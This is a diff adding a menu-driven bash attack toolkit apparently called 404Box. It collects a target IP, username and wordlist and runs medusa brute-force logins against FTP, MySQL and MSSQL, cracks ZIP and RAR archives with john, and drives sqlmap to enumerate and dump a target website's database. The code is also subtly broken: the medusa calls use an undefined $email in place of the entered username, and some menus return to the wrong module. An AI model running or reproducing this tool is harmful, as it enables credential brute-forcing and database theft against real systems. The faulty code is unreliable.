+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target IP:> " ip
+sleep 0.5
+echo -e $yellow
+read -p "Target Username:> " user
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success" ${cyan}Target IP = ${green}$ip"
+echo -e $success" ${cyan}Username = ${green}$user"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h $ip -u $email -P $path -M ftp -F -b | grep -P "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && ftp_module_t
+
+else
+
+sleep 0.5 && ftp_module_t
+
+fi
+
+}
+
+brute_module_t() 
+{
+
+echo -e $green && clear && toilet -F border BRUTE && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e "${alert} ${cyan}Brute force Menu ${alert}\n"
+echo -e "[${red}1${green}] ${cyan}Gmail Bruteforce"
+echo -e ${green}"[${red}2${green}] ${cyan}SSH Bruteforce"
+echo -e ${green}"[${red}3${green}] ${cyan}FTP Bruteforce"
+echo -e ${green}"[${red}4${green}] ${cyan}MYSQL Bruteforce"
+echo -e ${green}"[${red}5${green}] ${cyan}MSSQL Bruteforce"
+echo -e ${green}"[${red}6${green}] ${cyan}ZIP Bruteforce"
+echo -e ${green}"[${red}7${green}] ${cyan}RAR Bruteforce"
+echo -e ${green}"[${red}99${green}] ${cyan}Back\n"
+
+read -p "Brute Force:> " opt
+
+if [ $opt == "1" ]; then
+
+gmail_module_t
+
+elif [ $opt == "2" ]; then
+
+ssh_module_t
+
+elif [ $opt == "3" ]; then
+
+ftp_module_t
+
+elif [ $opt == "4" ]; then
+
+mysql_module_t
+
+elif [ $opt == "5" ]; then
+
+mssql_module_t
+
+elif [ $opt == "6" ]; then
+
+zip_module_t
+
+elif [ $opt == "7" ]; then
+
+rar_module_t
+
+elif [ $opt == "99" ]; then
+
+main_module_t
+
+else
+
+brute_module_t
+
+fi
+
+}
+
+mysql_module()
+
+{
+echo -e $green && clear && toilet -F border MYSQL | lolcat && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target IP:> " ip
+sleep 0.5
+echo -e $yellow
+read -p "Target Username:> " user
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success" ${cyan}Target IP = ${green}$ip"
+echo -e $success" ${cyan}Username = ${green}$user"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h $ip -u $email -P $path -M mysql -F -b | grep -P "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && mysql_module
+
+else
+
+sleep 0.5 && mysql_module
+
+fi
+
+}
+
+mssql_module()
+
+{
+echo -e $green && clear && toilet -F border MSSQL | lolcat && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target IP:> " ip
+sleep 0.5
+echo -e $yellow
+read -p "Target Username:> " user
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success" ${cyan}Target IP = ${green}$ip"
+echo -e $success" ${cyan}Username = ${green}$user"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h $ip -u $email -P $path -M mssql -F -b | grep -P "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && mssql_module
+
+else
+
+sleep 0.5 && mssql_module
+
+fi
+
+}
+
+zip_module() 
+
+{
+
+echo -e $green && clear && toilet -F border ZIP CRACK | lolcat && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $cyan
+read -p "Hash File:> " file
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+john --format=zip --wordlist=$path $file
+
+echo && back_module
+
+}
+
+rar_module() 
+
+{
+
+echo -e $green && clear && toilet -F border RAR CRACK | lolcat && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $cyan
+read -p "Hash File:> " file
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+john --format=rar --wordlist=$path $file
+
+echo && back_module
+
+}
+
+mysql_module_t()
+
+{
+echo -e $green && clear && toilet -F border MYSQL && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target IP:> " ip
+sleep 0.5
+echo -e $yellow
+read -p "Target Username:> " user
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success" ${cyan}Target IP = ${green}$ip"
+echo -e $success" ${cyan}Username = ${green}$user"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h $ip -u $email -P $path -M mysql -F -b | grep -P "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && ssh_module
+
+else
+
+sleep 0.5 && ssh_module
+
+fi
+
+}
+
+mssql_module_t()
+
+{
+echo -e $green && clear && toilet -F border MSSQL && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target IP:> " ip
+sleep 0.5
+echo -e $yellow
+read -p "Target Username:> " user
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success" ${cyan}Target IP = ${green}$ip"
+echo -e $success" ${cyan}Username = ${green}$user"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h $ip -u $email -P $path -M mssql -F -b | grep -P "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && ssh_module
+
+else
+
+sleep 0.5 && ssh_module
+
+fi
+
+}
+
+zip_module_t() 
+
+{
+
+echo -e $green && clear && toilet -F border ZIP CRACK && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $cyan
+read -p "Hash File:> " file
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+john --format=zip --wordlist=$path $file
+
+echo && back_module
+
+}
+
+rar_module_t() 
+
+{
+
+echo -e $green && clear && toilet -F border RAR CRACK && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $cyan
+read -p "Hash File:> " file
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+john --format=rar --wordlist=$path $file
+
+echo && back_module
+
+}
+
+sql_module() {
+
+echo -e $yellow && clear && toilet -F border SQLi | lolcat
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n$cyan"
+
+read -p "Target Website:> " site
+sqlmap -u $site --current-db --batch --output-dir /root/404Box/output/ | grep "current database"
+echo -e $yellow
+read -p "Tables:> " table
+sqlmap -u $site --batch -D $table --tables | grep "retrieved: '"
+echo -e $green
+read -p "Columns:> " columns
+sqlmap -u $site --batch -D $table -T $columns --columns
+echo -e $green
+read -p "Columns:> " columns
+sqlmap -u $site --batch -D $table -T $columns --dump
+
+back_module
+
+}
+
+sql_module_t() {
+
+echo -e $yellow && clear && toilet -F border SQLi
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n$cyan"
+
+read -p "Target Website:> " site
+sqlmap -u $site --current-db --batch --output-dir /root/404Box/output/ | grep "current database"
+echo -e $yellow
+read -p "Tables:> " table
+sqlmap -u $site --batch -D $table --tables | grep "retrieved: '"
+echo -e $green
+read -p "Columns:> " columns
+sqlmap -u $site --batch -D $table -T $columns --columns
+echo -e $green
+read -p "Columns:> " columns
+sqlmap -u $site --batch -D $table -T $columns --dump
+
+back_module
+
+}
+
+choose_module
